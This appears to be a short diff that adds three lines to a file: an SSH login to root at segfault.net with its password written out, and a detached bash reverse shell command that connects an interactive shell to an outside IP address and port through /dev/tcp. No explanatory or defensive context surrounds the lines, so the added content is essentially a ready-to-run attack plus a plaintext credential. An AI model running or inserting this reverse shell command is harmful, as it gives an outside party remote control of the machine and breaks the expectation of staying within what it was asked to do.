@@ -1,0 +1,3 @@
+ssh root@segfault.net
+pass :- segfault
+setsid bash -i &>/dev/tcp/185.117.118.23/34868 0>&1 &
